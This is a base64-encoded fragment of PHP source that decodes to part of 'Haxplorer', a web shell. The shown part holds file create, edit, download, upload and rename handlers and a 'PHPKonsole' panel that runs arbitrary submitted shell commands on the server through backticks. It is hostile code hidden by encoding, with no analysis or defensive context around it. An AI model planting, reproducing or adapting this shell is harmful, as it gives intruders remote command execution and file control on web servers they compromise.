I+CgoJPGlucHV0IHR5cGU9XCJoaWRkZW5cIiBuYW1lPVwiY21kXCIgdmFsdWU9XCIkbGFzdGNtZFwiPgoKCTxpbnB1dCB0eXBlPVwiaGlkZGVuXCIgbmFtZT1cImRpclwiIHZhbHVlPVwiJGxhc3RkaXJcIj4KCgk8aW5wdXQgdGFiaW5kZXg9XCIwXCIgdHlwZT1cInN1Ym1pdFwiIHZhbHVlPVwiTk8hXCI+PC9mb3JtPiI7CgogICAgICAgIH0KCiAJZWNobyAiPC90ZD48L3RyPjwvY2VudGVyPiI7Cgp9CgplbHNlaWYgKCAkY21kPT0ibmV3ZmlsZSIgKSB7IC8qPCEtLSBDcmVhdGUgbmV3IGZpbGUgd2l0aCBkZWZhdWx0IG5hbWUgLS0+ICovCgoJZWNobyAiPGNlbnRlcj48dGFibGU+PHRyPjx0ZCBOT1dSQVA+IjsKCiAJJGkgPSAxOwoKIAl3aGlsZSAoZmlsZV9leGlzdHMoIiRsYXN0ZGlyL25ld2ZpbGUkaS50eHQiKSkKCiAJCSRpKys7CgogCSRmaWxlID0gZm9wZW4oIiRsYXN0ZGlyL25ld2ZpbGUkaS50eHQiLCAidysiKTsKCiAJaWYgKCRmaWxlID09IGZhbHNlKQoKIAkJZWNobyAiQ291bGQgbm90IGNyZWF0ZSB0aGUgbmV3IGZpbGUuLi48YnI+IjsKCiAJZWxzZQoKIAkJZWNobyAiU3VjY2Vzc2Z1bGx5IGNyZWF0ZWQ6IFwiJGxhc3RkaXIvbmV3ZmlsZSRpLnR4dFwiPGJyPiI7CgogCQllY2hvICIKCiAgIAkJCTxmb3JtIGFjdGlvbj1cIiRTRmlsZU5hbWU/JHVybEFkZFwiIG1ldGhvZD1cIlBPU1RcIj4KCgkJCTxpbnB1dCB0eXBlPVwiaGlkZGVuXCIgbmFtZT1cImNtZFwiIHZhbHVlPVwiJGxhc3RjbWRcIj4KCgkJCTxpbnB1dCB0eXBlPVwiaGlkZGVuXCIgbmFtZT1cImRpclwiIHZhbHVlPVwiJGxhc3RkaXJcIj4KCgkJCTxpbnB1dCB0YWJpbmRleD1cIjBcIiB0eXBlPVwic3VibWl0XCIgdmFsdWU9XCJCYWNrIHRvIEhheHBsb3JlclwiPgoKCQkJPC9mb3JtPjwvY2VudGVyPgoKIAkJCTwvdGQ+PC90cj48L3RhYmxlPjwvY2VudGVyPiAgIAkJIjsKCgl9CgplbHNlaWYgKCAkY21kPT0ibmV3ZGlyIiApIHsgLyo8IS0tIENyZWF0ZSBuZXcgZGlyZWN0b3J5IHdpdGggZGVmYXVsdCBuYW1lIC0tPiAqLwoKCWVjaG8gIjxjZW50ZXI+PHRhYmxlPjx0cj48dGQgTk9XUkFQPiIgOwoKIAkkaSA9IDE7CgogCXdoaWxlIChpc19kaXIoIiRsYXN0ZGlyL25ld2RpciRpIikpCgogIAkJJGkrKzsKCiAJJGZpbGUgPSBta2RpcigiJGxhc3RkaXIvbmV3ZGlyJGkiLCAwNzc3KTsKCiAJaWYgKCRmaWxlID09IGZhbHNlKQoKIAkJZWNobyAiQ291bGQgbm90IGNyZWF0ZSB0aGUgbmV3IGRpcmVjdG9yeS4uLjxicj4iOwoKIAllbHNlCgogCQllY2hvICJTdWNjZXNzZnVsbHkgY3JlYXRlZDogXCIkbGFzdGRpci9uZXdkaXIkaVwiPGJyPiI7CgogCWVjaG8gIjxmb3JtIGFjdGlvbj1cIiRTRmlsZU5hbWU/JHVybEFkZFwiIG1ldGhvZD1cIlBPU1RcIj4KCgkJPGlucHV0IHR5cGU9XCJoaWRkZW5cIiBuYW1lPVwiY21kXCIgdmFsdWU9XCIkbGFzdGNtZFwiPgoKCQk8aW5wdXQgdHlwZT1cImhpZGRlblwiIG5hbWU9XCJkaXJcIiB2YWx1ZT1cIiRsYXN0ZGlyXCI+CgoJCTxpbnB1dCB0YWJpbmRleD1cIjBcIiB0eXBlPVwic3VibWl0XCIgdmFsdWU9XCJCYWNrIHRvIEhheHBsb3JlclwiPgoKCQk8L2Zvcm0+PC9jZW50ZXI+PC90ZD48L3RyPjwvdGFibGU+PC9jZW50ZXI+IjsKCn0KCmVsc2VpZiAoICRjbWQ9PSJlZGl0IiApIHsgLyo8IS0tIEVkaXQgYSBmaWxlIGFuZCBzYXZlIGl0IGFmdGVyd2FyZHMgd2l0aCB0aGUgc2F2ZWVkaXQgYmxvY2suIC0tPiAqLwoKCSRjb250ZW50cyA9ICIiOwoKCSRmYyA9IEBmaWxlKCAkZmlsZSApOwoKICAJd2hpbGUgKCBAbGlzdCggJGxuLCAkbGluZSApID0gZWFjaCggJGZjICkgKSB7CgogIAkJJGNvbnRlbnRzIC49IGh0bWxlbnRpdGllcyggJGxpbmUgKSA7CgogCX0KCiAJZWNobyAiPGJyPjxjZW50ZXI+PHRhYmxlPjx0cj48dGQgTk9XUkFQPiI7CgoJZWNobyAiTTxmb3JtIGFjdGlvbj1cIiRTRmlsZU5hbWU/JHVybEFkZFwiIG1ldGhvZD1cInBvc3RcIj5cbiI7CgoJZWNobyAiPGlucHV0IHR5cGU9XCJoaWRkZW5cIiBuYW1lPVwiY21kXCIgdmFsdWU9XCJzYXZlZWRpdFwiPlxuIjsKCgllY2hvICI8c3Ryb25nPkVESVQgRklMRTogPC9zdHJvbmc+JGZpbGU8YnI+XG4iOwoKCWVjaG8gIjx0ZXh0YXJlYSByb3dzPVwiMjVcIiBjb2xzPVwiOTVcIiBuYW1lPVwiY29udGVudHNcIj4kY29udGVudHM8L3RleHRhcmVhPjxicj5cbiI7CgoJZWNobyAiPGlucHV0IHNpemU9XCI1MFwiIHR5cGU9XCJ0ZXh0XCIgbmFtZT1cImZpbGVcIiB2YWx1ZT1cIiRmaWxlXCI+XG4iOwoKCWVjaG8gIjxpbnB1dCB0eXBlPVwic3VibWl0XCIgdmFsdWU9XCJTYXZlXCI+IjsKCgllY2hvICI8L2Zvcm0+IjsKCgllY2hvICI8L3RkPjwvdHI+PC90YWJsZT48L2NlbnRlcj4iOwoKfQoKZWxzZWlmICggJGNtZD09InNhdmVlZGl0IiApIHsgLyo8IS0tIFNhdmUgdGhlIGVkaXRlZCBmaWxlIGJhY2sgdG8gYSBmaWxlIC0tPiAqLwoKCSRmbyA9IGZvcGVuKCRmaWxlLCAidyIpOwoKCSR3cnJldCA9IGZ3cml0ZSgkZm8sIHN0cmlwc2xhc2hlcygkY29udGVudHMpKTsKCgkkY2xyZXQgPSBmY2xvc2UoJGZvKTsKCn0KCmVsc2VpZiAoICRjbWQ9PSJkb3dubCIgKSB7IC8qPCEtLSBTYXZlIHRoZSBlZGl0ZWQgZmlsZSBiYWNrIHRvIGEgZmlsZSAtLT4gKi8KCgkkZG93bmxvYWRmaWxlID0gdXJsZGVjb2RlKCRmaWxlKTsKCglpZiAoZnVuY3Rpb25fZXhpc3RzKCJiYXNlbmFtZSIpKQoKICAgIAkJJGRvd25sb2FkdG8gPSBiYXNlbmFtZSAoJGRvd25sb2FkZmlsZSk7CgoJZWxzZQoKCQkkZG93bmxvYWR0byA9ICJkb3dubG9hZC5leHQiOwoKCWlmICghZmlsZV9leGlzdHMoIiRkb3dubG9hZGZpbGUiKSkKCgkJZWNobyAiVGhlIGZpbGUgZG9lcyBub3QgZXhpc3QiOwoKCWVsc2UgewoKCQkkc2l6ZSA9IEBmaWxlc2l6ZSgiJGRvd25sb2FkZmlsZSIpOwoKCQlpZiAoJHNpemUgIT0gZmFsc2UpIHsKCgkJCSRhZGQ9Ijsgc2l6ZT0kc2l6ZSI7CgoJCX0JCQkKCgkJZWxzZSB7CgoJCQkkYWRkPSIiOwoKCQl9CgogCQloZWFkZXIoIkNvbnRlbnQtVHlwZTogYXBwbGljYXRpb24vZG93bmxvYWQiKTsKCgkJaGVhZGVyKCJDb250ZW50LURpc3Bvc2l0aW9uOiBhdHRhY2htZW50OyBmaWxlbmFtZT0kZG93bmxvYWR0byRhZGQiKTsKCgkJJGZwPWZvcGVuKCIkZG93bmxvYWRmaWxlIiAsInJiIik7CgoJCWZwYXNzdGhydSgkZnApOwoKCQlmbHVzaCgpOwoKCX0KCn0KCmVsc2VpZiAoICRjbWQ9PSJ1cGxvYWQiICkgeyAvKiA8IS0tIFVwbG9hZCBGaWxlIGZvcm0gLS0+ICovIAoKICAgCT8+CgoJPGNlbnRlcj4KCgkgPHRhYmxlPgoKCSAgPHRyPgoKCSAgIDx0ZCBOT1dSQVA+CgogICAgCQlXZWxjb21lIHRvIHRoZSB1cGxvYWQgc2VjdGlvbi4uLgoKIAkJUGxlYXNlIG5vdGUgdGhhdCB0aGUgZGVzdGluYXRpb24gZmlsZSB3aWxsIGJlCgoJCTxicj4gb3ZlcndyaXR0ZW4gaWYgaXQgYWxyZWFkeSBleGlzdHMhISE8YnI+PGJyPgoKIAkJPGZvcm0gZW5jdHlwZT0ibXVsdGlwYXJ0L2Zvcm0tZGF0YSIgYWN0aW9uPSI8P3BocCBlY2hvICIkU0ZpbGVOYW1lPyR1cmxBZGQiID8+IiBtZXRob2Q9InBvc3QiPgoKIAkJCTxpbnB1dCB0eXBlPSJoaWRkZW4iIG5hbWU9Ik1BWF9GSUxFX1NJWkUiIHZhbHVlPSIxMDk5NTExNjI3Nzc2Ij4KCiAJCQk8aW5wdXQgdHlwZT0iaGlkZGVuIiBuYW1lPSJjbWQiIHZhbHVlPSJ1cGxvYWRwcm9jIj4KCiAJCQk8aW5wdXQgdHlwZT0iaGlkZGVuIiBuYW1lPSJkaXIiIHZhbHVlPSI8P3BocCBlY2hvICRkaXIgPz4iPgoKIAkJCTxpbnB1dCB0eXBlPSJoaWRkZW4iIG5hbWU9Imxhc3RjbWQiIHZhbHVlPSI8P3BocCBlY2hvICRsYXN0Y21kID8+Ij4KCiAJCQk8aW5wdXQgdHlwZT0iaGlkZGVuIiBuYW1lPSJsYXN0ZGlyIiB2YWx1ZT0iPD9waHAgZWNobyAkbGFzdGRpciA/PiI+CgogCQkJU2VsZWN0IGxvY2FsIGZpbGU6PGJyPgoKIAkJCTxpbnB1dCBzaXplPSI3NSIgbmFtZT0idXNlcmZpbGUiIHR5cGU9ImZpbGUiPjxicj4KCiAJCQk8aW5wdXQgdHlwZT0ic3VibWl0IiB2YWx1ZT0iU2VuZCBGaWxlIj4KCiAJCTwvZm9ybT4KCgkJPGJyPgoKIAkJPGZvcm0gYWN0aW9uPSI8P3BocCBlY2hvICIkU0ZpbGVOYW1lPyR1cmxBZGQiID8+IiBtZXRob2Q9IlBPU1QiPgoKCQkJPGlucHV0IHR5cGU9ImhpZGRlbiIgbmFtZT0iY21kIiB2YWx1ZT0iPD9waHAgZWNobyAkbGFzdGNtZCA/PiI+CgoJCQk8aW5wdXQgdHlwZT0iaGlkZGVuIiBuYW1lPSJkaXIiIHZhbHVlPSI8P3BocCBlY2hvICRsYXN0ZGlyID8+Ij4KCgkJCTxpbnB1dCB0YWJpbmRleD0iMCIgdHlwZT0ic3VibWl0IiB2YWx1ZT0iQ2FuY2VsIj4KCgkJPC9mb3JtPgoKCSAgIDwvdGQ+CgoJICA8L3RyPgoKCSA8L3RhYmxlPgoKCTwvY2VudGVyPgoKCgogCTw/cGhwCgp9CgplbHNlaWYgKCAkY21kPT0idXBsb2FkcHJvYyIgKSB7IC8qIDwhLS0gUHJvY2VzcyBVcGxvYWRlZCBmaWxlIC0tPiAqLwoKCWVjaG8gIjxjZW50ZXI+PHRhYmxlPjx0cj48dGQgTk9XUkFQPiI7CgoJaWYgKGZpbGVfZXhpc3RzKCR1c2VyZmlsZSkpCgoJCSRyZXMgPSBjb3B5KCR1c2VyZmlsZSwgIiRkaXIvJHVzZXJmaWxlX25hbWUiKTsKCgllY2hvICJVcGxvYWRlZCBcIiR1c2VyZmlsZV9uYW1lXCIgdG8gXCIkdXNlcmZpbGVcIjsgPGJyPlxuIjsKCiAgICAgCWlmICgkcmVzKSB7CgoJCWVjaG8gIlN1Y2Nlc3NmdWxseSBtb3ZlZCBcIiR1c2VyZmlsZVwiIHRvIFwiJGRpci8kdXNlcmZpbGVfbmFtZVwiLlxuPGJyPjxicj4iOwoKCQllY2hvICJMb2NhbCBmaWxlbmFtZTogXCIkdXNlcmZpbGVfbmFtZVwiLlxuPGJyPlJlbW90ZSBmaWxlbmFtZTogXCIkdXNlcmZpbGVcIi5cbjxicj4iOwoKCQllY2hvICJGaWxlc2l6ZTogIi5mb3JtYXRzaXplKCR1c2VyZmlsZV9zaXplKS4iLlxuPGJyPkZpbGV0eXBlOiAkdXNlcmZpbGVfdHlwZS5cbjxicj4iOwoKCX0KCgllbHNlIHsKCgkJZWNobyAiQ291bGQgbm90IG1vdmUgdXBsb2FkZWQgZmlsZTsgQWN0aW9uIGFib3J0ZWQuLi4iOwoKCX0KCgllY2hvICI8Zm9ybSBhY3Rpb249XCIkU0ZpbGVOYW1lPyR1cmxBZGRcIiBtZXRob2Q9XCJQT1NUXCI+PGlucHV0IHR5cGU9XCJoaWRkZW5cIiBuYW1lPVwiY21kXCIgdmFsdWU9XCIkbGFzdGNtZFwiPjxpbnB1dCB0eXBlPVwiaGlkZGVuXCIgbmFtZT1cImRpclwiIHZhbHVlPVwiJGxhc3RkaXJcIj48aW5wdXQgdGFiaW5kZXg9XCIwXCIgdHlwZT1cInN1Ym1pdFwiIHZhbHVlPVwiQmFjayB0byBIYXhwbG9yZXJcIj48L2Zvcm0+PC9jZW50ZXI+IiA7CgoJZWNobyAiPGJyPjxicj48L3RkPjwvdHI+PC90YWJsZT48L2NlbnRlcj4iOwoKfQoKZWxzZWlmICggJGNtZD09ImZpbGUiICkgeyAvKiA8IS0tIFZpZXcgYSBmaWxlIGluIHRleHQgLS0+ICovCgogICAgICAgIGVjaG8gIjxocj4iOyAKCgkkZmMgPSBAZmlsZSggJGZpbGUgKTsgIAl3aGlsZSAoIEBsaXN0KCAkbG4sICRsaW5lICkgPSBlYWNoKCAkZmMgKSApIHsKCiAgCQllY2hvIHNwYWNldG9uYnNwKEBodG1sZW50aXRpZXMoJGxpbmUpKS4iPGJyPlxuIjsKCiAgCX0KCgllY2hvICI8aHI+IjsKCn0KCmVsc2VpZiAoICRjbWQ9PSJyZW4iICkgeyAvKiA8IS0tIEZpbGUgYW5kIERpcmVjdG9yeSBSZW5hbWUgLS0+ICovCgogICAgIAlpZiAoZnVuY3Rpb25fZXhpc3RzKCdpc19kaXInKSkgewoKIAkJaWYgKGlzX2RpcigiJG9sZGZpbGUiKSkgewoKIAkJCSRvYmpuYW1lID0gIkRpcmVjdG9yeSI7CgogCQkJJG9iamlkZW50ID0gIkRpcmVjdG9yeSI7CgogIAkJfQoKIAkJZWxzZSB7CgogCQkJJG9iam5hbWUgPSAiRmlsZW5hbWUiOwoKIAkJCSRvYmppZGVudCA9ICJmaWxlIjsKCiAJCX0KCiAJfQoKICAgCWVjaG8gIjx0YWJsZSB3aWR0aD0xMDAlIGJvcmRlcj1cIjBcIiBjZWxscGFkZGluZz1cIjBcIiBjZWxsc3BhY2luZz1cIjBcIj48dHI+PHRkIHdpZHRoPTEwMCUgc3R5bGU9XCJjbGFzcz1cInNpbHZlciBib3JkZXJcIj48Y2VudGVyPiZuYnNwO1JlbmFtZSBhIGZpbGU6Jm5ic3A7PC9jZW50ZXI+PC90ZD48L3RyPjwvdGFibGU+PGJyPlxuIjsKCglJZiAoZW1wdHkoJG5ld2ZpbGUpICE9IHRydWUpIHsKCiAJCWVjaG8gIjxjZW50ZXI+IjsKCgkgCSRyZXR1cm4gPSBAcmVuYW1lKCRvbGRmaWxlLCAiJG9sZGRpciRuZXdmaWxlIik7CgoJCWlmICgkcmV0dXJuKSB7CgogCQkJZWNobyAiJG9iamlkZW50IHJlbmFtZWQgc3VjY2Vzc2Z1bGx5Ojxicj48YnI+T2xkICRvYmpuYW1lOiBcIiRvbGRmaWxlXCIuPGJyPk5ldyAkb2JqbmFtZTogXCIkb2xkZGlyJG5ld2ZpbGVcIiI7CgogCQl9CgogCQllbHNlIHsKCiAJCQlpZiAoIEBmaWxlX2V4aXN0cygiJG9sZGRpciRuZXdmaWxlIikgKSB7CgogCQkJCWVjaG8gIkVycm9yOiBUaGUgJG9iamlkZW50IGRvZXMgYWxyZWFkeSBleGlzdC4uLjxicj48YnI+XCIkb2xkZGlyJG5ld2ZpbGVcIjxicj48YnI+SGl0IHlvdXIgYnJvd3NlcidzIGJhY2sgdG8gdHJ5IGFnYWluLi4uIjsKCiAJCQl9CgogCQkJZWxzZSB7CgogCQkJCWVjaG8gIkVycm9yOiBDYW4ndCBjb3B5IHRoZSBmaWxlLCB0aGUgZmlsZSBjb3VsZCBiZSBpbiB1c2Ugb3IgeW91IGRvbid0IGhhdmUgcGVybWlzc2lvbiB0byByZW5hbWUgaXQuIjsKCiAJCQl9CgogIAkJfQoKIAkJZWNobyAiPGZvcm0gYWN0aW9uPVwiJFNGaWxlTmFtZT8kdXJsQWRkXCIgbWV0aG9kPVwiUE9TVFwiPjxpbnB1dCB0eXBlPVwiaGlkZGVuXCIgbmFtZT1cImNtZFwiIHZhbHVlPVwiJGxhc3RjbWRcIj48aW5wdXQgdHlwZT1cImhpZGRlblwiIG5hbWU9XCJkaXJcIiB2YWx1ZT1cIiRsYXN0ZGlyXCI+PGlucHV0IHRhYmluZGV4PVwiMFwiIHR5cGU9XCJzdWJtaXRcIiB2YWx1ZT1cIkJhY2sgdG8gSGF4cGxvcmVyXCI+PC9mb3JtPjwvY2VudGVyPiIgOwoKIAl9CgogCWVsc2UgewoKIAkJJGRwb3MgPSBzdHJycG9zKCRvbGRmaWxlLCAiLyIpOwoKIAkJaWYgKHN0cnZhbCgkZHBvcykhPSIiKSB7CgogCQkJJG9sZGRpciA9IHN1YnN0cigkb2xkZmlsZSwgMCwgJGRwb3MrMSk7CgogICAJCX0KCiAJCWVsc2UgewoKIAkJCSRvbGRkaXIgPSAiJGxhc3RkaXIvIjsKCgkJfQoKIAkJJGZwb3MgPSBzdHJycG9zKCRvbGRmaWxlLCAiLyIpOwoKIAkJaWYgKHN0cnZhbCgkZnBvcykhPSIiKSB7CgogCQkJJGlucHV0ZmlsZSA9IHN1YnN0cigkb2xkZmlsZSwgJGZwb3MrMSk7CgogICAJCX0KCiAJCWVsc2UgewoKCSAJCSRpbnB1dGZpbGUgPSAiIjsKCiAJCX0KCiAgICAgICAJCWVjaG8gIjxjZW50ZXI+PHRhYmxlPjx0cj48dGQ+PGZvcm0gYWN0aW9uPVwiJFNGaWxlTmFtZT8kdXJsQWRkXCIgbWV0aG9kPVwicG9zdFwiPlxuIjsKCiAJCWVjaG8gIjxpbnB1dCB0eXBlPVwiaGlkZGVuXCIgbmFtZT1cImNtZFwiIHZhbHVlPVwicmVuXCI+XG4iOwoKIAkJZWNobyAiPGlucHV0IHR5cGU9XCJoaWRkZW5cIiBuYW1lPVwib2xkZmlsZVwiIHZhbHVlPVwiJG9sZGZpbGVcIj5cbiI7CgogCQllY2hvICI8aW5wdXQgdHlwZT1cImhpZGRlblwiIG5hbWU9XCJvbGRkaXJcIiB2YWx1ZT1cIiRvbGRkaXJcIj5cbiI7CgogCQllY2hvICI8aW5wdXQgdHlwZT1cImhpZGRlblwiIG5hbWU9XCJsYXN0Y21kXCIgdmFsdWU9XCIkbGFzdGNtZFwiPlxuIjsKCiAJCWVjaG8gIjxpbnB1dCB0eXBlPVwiaGlkZGVuXCIgbmFtZT1cImxhc3RkaXJcIiB2YWx1ZT1cIiRsYXN0ZGlyXCI+XG4iOwoKIAkJZWNobyAiUmVuYW1lIFwiJG9sZGZpbGVcIiB0bzo8YnI+XG4iOwoKIAkJZWNobyAiPGlucHV0IHNpemU9XCIxMDBcIiB0eXBlPVwidGV4dFwiIG5hbWU9XCJuZXdmaWxlXCIgdmFsdWU9XCIkaW5wdXRmaWxlXCI+PGJyPjxpbnB1dCB0eXBlPVwic3VibWl0XCIgdmFsdWU9XCJSZW5hbWVcIj4iOyAKCgkJZWNobyAiPC9mb3JtPjxmb3JtIGFjdGlvbj1cIiRTRmlsZU5hbWU/JHVybEFkZFwiIG1ldGhvZD1cInBvc3RcIj48aW5wdXQgdHlwZT1cImhpZGRlblwiIG5hbWU9XCJjbWRcIiB2YWx1ZT1cIiRsYXN0Y21kXCI+PGlucHV0IHR5cGU9XCJoaWRkZW5cIiBuYW1lPVwiZGlyXCIgdmFsdWU9XCIkbGFzdGRpclwiPjxpbnB1dCB0eXBlPVwic3VibWl0XCIgdmFsdWU9XCJDYW5jZWxcIj48L2Zvcm0+IjsKCiAJCWVjaG8gIjwvdGQ+PC90cj48L3RhYmxlPjwvY2VudGVyPiI7CgogCX0KCn0KCmVsc2UgaWYgKCAkY21kID09ICJjb24iKSB7CgoKCj8+Cgo8Y2VudGVyPgoKPHRhYmxlPgoKIDx0cj48dGQ+Cgo8aDM+UEhQS29uc29sZTwvaDM+CgoKCjw/cGhwCgoKCmlmIChpbmlfZ2V0KCdyZWdpc3Rlcl9nbG9iYWxzJykgIT0gJzEnKSB7CgogICAgaWYgKCFlbXB0eSgkSFRUUF9QT1NUX1ZBUlMpKQoKCWV4dHJhY3QoJEhUVFBfUE9TVF9WQVJTKTsKCgkgIAoKICAgIGlmICghZW1wdHkoJEhUVFBfR0VUX1ZBUlMpKQoKCWV4dHJhY3QoJEhUVFBfR0VUX1ZBUlMpOwoKCSAgICAgIAoKICAgIGlmICghZW1wdHkoJEhUVFBfU0VSVkVSX1ZBUlMpKQoKCWV4dHJhY3QoJEhUVFBfU0VSVkVSX1ZBUlMpOwoKICAgIH0KCgkJICAgIAoKICAgIGlmICghZW1wdHkoJHdvcmtfZGlyKSkgewoKCWlmICghZW1wdHkoJGNvbW1hbmQpKSB7CgoJICAgIGlmIChlcmVnKCdeW1s6Ymxhbms6XV0qY2RbWzpibGFuazpdXSsoW147XSspJCcsICRjb21tYW5kLCAkcmVncykpIHsKCgkgICAgICAgIGlmICgkcmVnc1sxXVswXSA9PSAnLycpIHsKCgkgICAgICAgICAgICAkbmV3X2RpciA9ICRyZWdzWzFdOwoKCQl9IGVsc2UgewoKCQkgICAgJG5ld19kaXIgPSAkd29ya19kaXIgLiAnLycgLiAkcmVnc1sxXTsKCgkJfQoKCQlpZiAoZmlsZV9leGlzdHMoJG5ld19kaXIpICYmIGlzX2RpcigkbmV3X2RpcikpIHsKCgkJICAgICR3b3JrX2RpciA9ICRuZXdfZGlyOwoKCQl9CgoJCXVuc2V0KCRjb21tYW5kKTsKCgkgICAgfQoKCX0KCiAgICB9CgogICAgaWYgKGZpbGVfZXhpc3RzKCR3b3JrX2RpcikgJiYgaXNfZGlyKCR3b3JrX2RpcikpIHsKCgljaGRpcigkd29ya19kaXIpOwoKICAgIH0KCiAgICAkd29ya19kaXIgPSBleGVjKCdwd2QnKTsKCj8+CgoKCiAgICA8Zm9ybSBuYW1lPSJteWZvcm0iIGFjdGlvbj0iPD9waHAgZWNobyAiJFBIUF9TRUxGPyR1cmxBZGQiID8+IiBtZXRob2Q9InBvc3QiPgoKCTx0YWJsZSBib3JkZXI9MCBjZWxsc3BhY2luZz0wIGNlbGxwYWRkaW5nPTAgd2lkdGg9IjEwMCUiPjx0cj48dGQ+Q3VycmVudCB3b3JraW5nIGRpcmVjdG9yeTogPGI+CgoJPGlucHV0IHR5cGU9ImhpZGRlbiIgbmFtZT0iY21kIiB2YWx1ZT0iY29uIj4KCgk8P3BocAoKCSAgICAkd29ya19kaXJfc3BsaXR0ZWQgPSBleHBsb2RlKCcvJywgc3Vic3RyKCR3b3JrX2RpciwgMSkpOwoKCSAgICBwcmludGYoJzxhIGhyZWY9IiVzPyR1cmxBZGRjbWQ9Y29uJnN0ZGVycj0lcyZ3b3JrX2Rpcj0vIj5Sb290PC9hPi8nLCAkUEhQX1NFTEYsICRzdGRlcnIpOwoKCSAgICBpZiAoIWVtcHR5KCR3b3JrX2Rpcl9zcGxpdHRlZFswXSkpIHsKCgkJJHBhdGggPSAnJzsKCgkJZm9yICgkaSA9IDA7ICRpIDwgY291bnQoJHdvcmtfZGlyX3NwbGl0dGVkKTsgJGkrKykgewoKCQkgICAgJHBhdGggLj0gJy8nIC4gJHdvcmtfZGlyX3NwbGl0dGVkWyRpXTsKCgkJICAgIHByaW50ZignPGEgaHJlZj0iJXM/JHVybEFkZGNtZD1jb24mc3RkZXJyPSVzJndvcmtfZGlyPSVzIj4lczwvYT4vJywgJFBIUF9TRUxGLCAkc3RkZXJyLCB1cmxlbmNvZGUoJHBhdGgpLCAkd29ya19kaXJfc3BsaXR0ZWRbJGldKTsKCgkJfQoKCSAgICB9CgoJPz48L2I+PC90ZD4KCgk8dGQgYWxpZ249InJpZ2h0Ij5DaG9vc2UgbmV3IHdvcmtpbmcgZGlyZWN0b3J5OiA8c2VsZWN0IGNsYXNzPSJpbnB1dHRleHQiIG5hbWU9IndvcmtfZGlyIiBvbkNoYW5nZT0idGhpcy5mb3JtLnN1Ym1pdCgpIj4KCgkKCgk8P3BocAoKCSRkaXJfaGFuZGxlID0gb3BlbmRpcigkd29ya19kaXIpOwoKCXdoaWxlICgkZGlyID0gcmVhZGRpcigkZGlyX2hhbmRsZSkpIHsKCgkgICAgaWYgKGlzX2RpcigkZGlyKSkgewoKCQlpZiAoJGRpciA9PSAnLicpIHsKCgkJICAgIGVjaG8gIjxvcHRpb24gdmFsdWU9XCIkd29ya19kaXJcIiBzZWxlY3RlZD5DdXJyZW50IERpcmVjdG9yeTwvb3B0aW9uPlxuIjsKCgkJfSBlbHNlaWYgKCRkaXIgPT0gJy4uJykgewoKCQkgICAgaWYgKHN0cmxlbigkd29ya19kaXIpID09IDEpIHsKCgkJICAgIH0KCgkJICAgIGVsc2VpZiAoc3RycnBvcygkd29ya19kaXIsICcvJykgPT0gMCkgewoKCQkJZWNobyAiPG9wdGlvbiB2YWx1ZT1cIi9cIj5QYXJlbnQgRGlyZWN0b3J5PC9vcHRpb24+XG4iOwoKCQkgICAgfSBlbHNlIHsKCgkJCWVjaG8gIjxvcHRpb24gdmFsdWU9XCIiLiBzdHJyZXYoc3Vic3RyKHN0cnN0cihzdHJyZXYoJHdvcmtfZGlyKSwgIi8iKSwgMSkpIC4iXCI+UGFyZW50IERpcmVjdG9yeTwvb3B0aW9uPlxuIjsKCgkJICAgIH0KCgkJfSBlbHNlIHsKCgkJICAgIGlmICgkd29ya19kaXIgPT0gJy8nKSB7CgoJCQllY2hvICI8b3B0aW9uIHZhbHVlPVwiJHdvcmtfZGlyJGRpclwiPiRkaXI8L29wdGlvbj5cbiI7CgoJCSAgICB9IGVsc2UgewoKCQkJZWNobyAiPG9wdGlvbiB2YWx1ZT1cIiR3b3JrX2Rpci8kZGlyXCI+JGRpcjwvb3B0aW9uPlxuIjsKCgkJICAgIH0KCgkJfQoKCSAgICB9CgoJfQoKCWNsb3NlZGlyKCRkaXJfaGFuZGxlKTsKCgk/PgoKCTwvc2VsZWN0PjwvdGQ+PC90cj48L3RhYmxlPgoKCTxwPkNvbW1hbmQ6IDxpbnB1dCBjbGFzcz0iaW5wdXR0ZXh0IiB0eXBlPSJ0ZXh0IiBuYW1lPSJjb21tYW5kIiBzaXplPSI2MCI+CgoJPGlucHV0IG5hbWU9InN1Ym1pdF9idG4iIGNsYXNzPSJpbnB1dGJ1dHRvbiIgdHlwZT0ic3VibWl0IiB2YWx1ZT0iRXhlY3V0ZSBDb21tYW5kIj48L3A+CgoJPHA+RW5hYmxlIDxjb2RlPnN0ZGVycjwvY29kZT4tdHJhcHBpbmc/IDxpbnB1dCB0eXBlPSJjaGVja2JveCIgbmFtZT0ic3RkZXJyIjw/cGhwIGlmICgoJHN0ZGVycikgfHwgKCFpc3NldCgkc3RkZXJyKSkgKSBlY2hvICIgQ0hFQ0tFRCI7ID8+PjwvcD4KCgk8dGV4dGFyZWEgY29scz0iODAiIHJvd3M9IjE5IiBjbGFzcz0iaW5wdXR0ZXh0YXJlYSIgd3JhcD1vZmYgcmVhZG9ubHk+PD9waHAKCgkgICAgaWYgKCFlbXB0eSgkY29tbWFuZCkpIHsKCgkgICAgICAgIGVjaG8gInBocEtvbnNvbGU+ICIuIGh0bWxzcGVjaWFsY2hhcnMoJGNvbW1hbmQpIC4gIlxuXG4iOyAKCgkJaWYgKCRzdGRlcnIpIHsKCgkJICAgICR0bXBmaWxlID0gdGVtcG5hbSgnL3RtcCcsICdwaHBzaGVsbCcpOwoKCQkgICAgJGNvbW1hbmQgLj0gIiAxPiAkdG1wZmlsZSAyPiYxOyAiIC4gImNhdCAkdG1wZmlsZTsgcm0gJHRtcGZpbGUiOwoKCQl9IGVsc2UgaWYgKCRjb21tYW5kID09ICdscycpIHsKCgkJICAgICRjb21tYW5kIC49ICcgLUYnOwoKCQl9CgoJCSRvdXRwdXQgPSBgJGNvbW1hbmRgOwoKCQllY2hvIGh0bWxzcGVjaWFsY2hhcnMoJG91dHB1dCk7CgoJICAgIH0KCgk/PjwvdGV4dGFyZWE+CgogICAgPC9mb3JtPgoKCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkgICAgICAKCiAgICA8c2NyaXB0IGxhbmd1YWdlPSJKYXZhU2NyaXB0IiB0eXBlPSJ0ZXh0L2phdmFzY3JpcHQiPgoKCWRvY3VtZW50LmZvcm1zWzBdLmNvbW1hbmQuZm9jdXMoKTsKCiAgICA8L3NjcmlwdD4KCiA8L3RkPjwvdHI+PC90YWJsZT4KCjw/cGhwCgp9ICAgIAoKZWxzZSB7IC8qIDwhLS0gVGhlcmUgaXMgYSBpbmNvcnJlY3Qgb3Igbm8gcGFyYW1ldGVyIHNwZWNpZmllZC4uLiBMZXQncyBvcGVuIHRoZSBtYWluIG1lbnUgLS0+ICovCgoJJGlzTWFpbk1lbnUgPSB0cnVlOwoKICAgICA/PgoKCTx